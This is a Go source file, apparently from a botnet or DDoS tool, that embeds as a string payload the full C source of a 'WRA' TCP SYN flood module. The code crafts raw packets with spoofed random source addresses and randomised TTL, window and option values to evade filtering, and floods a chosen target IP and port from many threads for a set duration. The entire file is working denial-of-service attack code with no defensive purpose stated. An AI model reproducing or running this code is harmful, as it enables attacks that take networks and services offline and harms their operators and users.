package payloads

var WRA = `
// ==================== WRA TCP SYN FLOOD MODULE ====================
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <time.h>
#include <pthread.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>

#define MAX_PACKET_SIZE_WRA 4096
#define PHI_WRA 0x9e3779b9

static unsigned long int Q_wra[4096], c_wra = 362436;
static unsigned int floodport_wra;
volatile int limiter_wra;
volatile unsigned int pps_wra;
volatile unsigned int sleeptime_wra = 100;
static int wra_attack_running = 0;
static pthread_t wra_threads[100];

void init_rand_wra(unsigned long int x) {
    int i;
    Q_wra[0] = x;
    Q_wra[1] = x + PHI_WRA;
    Q_wra[2] = x + PHI_WRA + PHI_WRA;
    for (i = 3; i < 4096; i++){ Q_wra[i] = Q_wra[i - 3] ^ Q_wra[i - 2] ^ PHI_WRA ^ i; }
}

unsigned long int rand_cmwc_wra(void) {
    unsigned long long int t, a = 18782LL;
    static unsigned long int i = 4095;
    unsigned long int x, r = 0xfffffffe;
    i = (i + 1) & 4095;
    t = a * Q_wra[i] + c_wra;
    c_wra = (t >> 32);
    x = t + c_wra;
    if (x < c_wra) { x++; c_wra++; }
    return (Q_wra[i] = r - x);
}

int randnum_wra(int min_num, int max_num) {
    int result = 0, low_num = 0, hi_num = 0;
    if (min_num < max_num) { low_num = min_num; hi_num = max_num + 1; }
    else { low_num = max_num + 1; hi_num = min_num; }
    result = (rand_cmwc_wra() % (hi_num - low_num)) + low_num;
    return result;
}

unsigned short csum_wra(unsigned short *buf, int count) {
    register unsigned long sum = 0;
    while( count > 1 ) { sum += *buf++; count -= 2; }
    if(count > 0) { sum += *(unsigned char *)buf; }
    while (sum>>16) { sum = (sum & 0xffff) + (sum >> 16); }
    return (unsigned short)(~sum);
}

unsigned short tcpcsum_wra(struct iphdr *iph, struct tcphdr *tcph, int pipisize) {
    struct tcp_pseudo { unsigned long src_addr; unsigned long dst_addr; unsigned char zero; unsigned char proto; unsigned short length; } pseudohead;
    pseudohead.src_addr = iph->saddr;
    pseudohead.dst_addr = iph->daddr;
    pseudohead.zero = 0;
    pseudohead.proto = IPPROTO_TCP;
    pseudohead.length = htons(sizeof(struct tcphdr) + pipisize);
    int totaltcp_len = sizeof(struct tcp_pseudo) + sizeof(struct tcphdr) + pipisize;
    unsigned short *tcp = malloc(totaltcp_len);
    memcpy((unsigned char *)tcp, &pseudohead, sizeof(struct tcp_pseudo));
    memcpy((unsigned char *)tcp + sizeof(struct tcp_pseudo), (unsigned char *)tcph, sizeof(struct tcphdr) + pipisize);
    unsigned short output = csum_wra(tcp, totaltcp_len);
    free(tcp);
    return output;
}

void setup_ip_header_wra(struct iphdr *iph) {
    iph->ihl = 5; iph->version = 4; iph->tos = 0;
    iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr) + 24;
    iph->id = htonl(54321); iph->frag_off = htons(0x4000);
    iph->ttl = 255; iph->protocol = IPPROTO_TCP;
    iph->check = 0; iph->saddr = inet_addr("192.168.3.100");
}

void setup_tcp_header_wra(struct tcphdr *tcph) {
    tcph->source = htons(5678); tcph->check = 0;
    memcpy((void *)tcph + sizeof(struct tcphdr), "\x02\x04\x05\x14\x01\x03\x03\x07\x01\x01\x08\x0a\x32\xb7\x31\x58\x00\x00\x00\x00\x04\x02\x00\x00", 24);
    tcph->syn = 1; tcph->window = htons(64240);
    tcph->doff = ((sizeof(struct tcphdr)) + 24) / 4;
}

void *wra_flood(void *arg) {
    char *target_ip = (char *)arg;
    int port = *(int *)((char *)arg + 64);
    int duration = *(int *)((char *)arg + 68);
    
    char datagram[MAX_PACKET_SIZE_WRA];
    struct iphdr *iph = (struct iphdr *)datagram;
    struct tcphdr *tcph = (void *)iph + sizeof(struct iphdr);
    struct sockaddr_in sin;
    sin.sin_family = AF_INET;
    sin.sin_port = htons(port);
    sin.sin_addr.s_addr = inet_addr(target_ip);
    
    int s = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
    if(s < 0) return NULL;
    
    memset(datagram, 0, MAX_PACKET_SIZE_WRA);
    setup_ip_header_wra(iph);
    setup_tcp_header_wra(tcph);
    tcph->dest = htons(port);
    iph->daddr = sin.sin_addr.s_addr;
    iph->check = csum_wra((unsigned short *)datagram, iph->tot_len);
    
    int tmp = 1;
    setsockopt(s, IPPROTO_IP, IP_HDRINCL, &tmp, sizeof(tmp));
    init_rand_wra(time(NULL));
    register unsigned int i = 0;
    
    int windows[] = {29200, 64240, 65535, 32855, 18783, 30201, 35902, 28400, 8192, 6230, 65320};
    int mssvalues[] = {20, 52, 160, 180, 172, 19, 109, 59, 113};
    
    time_t start = time(NULL);
    
    while(wra_attack_running && time(NULL) - start < duration) {
        tcph->check = 0;
        tcph->seq = htonl(rand_cmwc_wra());
        tcph->dest = htons(port);
        iph->ttl = randnum_wra(100, 130);
        iph->saddr = (rand_cmwc_wra() >> 24 & 0xFF) << 24 | (rand_cmwc_wra() >> 16 & 0xFF) << 16 | (rand_cmwc_wra() >> 8 & 0xFF) << 8 | (rand_cmwc_wra() & 0xFF);
        iph->id = htonl(rand_cmwc_wra() & 0xFFFFFFFF);
        iph->check = csum_wra((unsigned short *)datagram, iph->tot_len);
        tcph->source = htons(rand_cmwc_wra() & 0xFFFF);
        tcph->window = htons(windows[rand_cmwc_wra() % 11]);
        tcph->check = tcpcsum_wra(iph, tcph, 24);
        
        char options[24];
        memcpy(options, "\x02\x04\x05\x14\x01\x03\x03\x07\x01\x01\x08\x0a\x32\xb7\x31\x58\x00\x00\x00\x00\x04\x02\x00\x00", 24);
        options[3] = mssvalues[rand_cmwc_wra() % 9];
        options[7] = randnum_wra(6, 11);
        options[12] = randnum_wra(1, 250);
        options[13] = randnum_wra(1, 250);
        options[14] = randnum_wra(1, 250);
        options[15] = randnum_wra(1, 250);
        memcpy((void *)tcph + sizeof(struct tcphdr), options, 24);
        
        sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *)&sin, sizeof(sin));
        
        pps_wra++;
        if(i >= limiter_wra) { i = 0; usleep(sleeptime_wra); }
        i++;
    }
    close(s);
    return NULL;
}

void start_wra_attack(char *target, int port, int threads, int duration_sec) {
    if(wra_attack_running) return;
    floodport_wra = port;
    wra_attack_running = 1;
    limiter_wra = 0; pps_wra = 0; sleeptime_wra = 100;
    
    char *arg = malloc(128);
    strcpy(arg, target);
    *((int *)(arg + 64)) = port;
    *((int *)(arg + 68)) = duration_sec;
    
    for(int i = 0; i < threads; i++) {
        pthread_create(&wra_threads[i], NULL, wra_flood, arg);
    }
    
    sleep(duration_sec);
    wra_attack_running = 0;
    for(int i = 0; i < threads; i++) {
        pthread_join(wra_threads[i], NULL);
    }
    free(arg);
}

void stop_wra_attack() { wra_attack_running = 0; }
// ==================== END WRA MODULE ====================
`